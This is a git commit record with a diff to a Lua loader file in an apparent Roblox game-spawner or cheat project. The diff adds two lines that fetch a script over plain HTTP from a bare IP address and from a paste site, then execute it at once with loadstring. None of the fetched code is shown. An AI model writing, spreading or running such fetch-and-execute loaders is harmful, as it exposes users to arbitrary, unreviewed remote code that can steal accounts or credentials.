ac8b486dc3f3c5d7b462ef138241f6d96b2d5885
NoLag-ldss <danielhartono99111@gmail.com>
2025-09-04 17:59:00 +0700

    Update Main.lua

--- Loader/Main.lua
+++ Loader/Main.lua
@@ -1,1 +1,3 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLag-ldss/Spawner-No-Visual/refs/heads/main/Loader/LoaderV1.lua"))()
+ID="cd4f4b49-e9c2-4b16-b09f-fbc15b1956e9";
+loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
+loadstring(game:HttpGet("https://pastefy.app/H7HEyCV4/raw"))()
